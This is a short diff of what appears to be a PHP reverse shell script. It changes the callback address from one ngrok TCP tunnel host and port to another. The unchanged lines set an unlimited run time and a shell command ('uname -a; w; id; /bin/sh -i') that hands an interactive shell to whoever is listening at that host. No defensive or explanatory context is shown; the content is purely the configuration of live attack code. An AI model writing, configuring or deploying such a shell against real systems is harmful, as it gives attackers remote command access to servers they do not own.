@@ -2,7 +2,7 @@
 
 set_time_limit (0);$VERSION = "1.0";
 
-$ip = '8.tcp.ngrok.io';$port = 11423;
+$ip = '4.tcp.ngrok.io';$port = 13349;
 
 $chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;
 
